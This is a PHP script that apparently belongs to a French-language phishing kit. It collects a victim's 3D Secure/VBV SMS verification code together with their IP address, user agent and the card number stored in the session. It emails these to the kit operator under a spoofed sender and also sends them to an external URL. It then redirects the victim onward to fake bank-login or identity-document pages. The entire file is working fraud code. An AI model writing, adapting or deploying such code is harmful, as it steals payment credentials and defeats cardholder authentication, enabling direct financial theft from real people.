<?php
	error_reporting(0);
	ob_start();
	session_start();

include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$message = '
_______________________________
Code 3DS : '.$_POST["vbv"].'
_______________________________
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';    
}
$Subject= "\xf0\x9f\x83\x8f SMS VBV/3DS - ".$_SESSION['c_num']." \xf0\x9f\x83\x8f"._ip();
$head="From:  \xf0\x9f\x95\xb7 ISK 17 \xf0\x9f\x95\xb7 <rez@ayz.com>";
$_SESSION['step_five']  = true;
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
if ($log_bank == "oui") {
    header('location:  ../bank.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif($cni == "oui") {
    header('location:  ../identity.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}else{
        header('location: ../success.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}
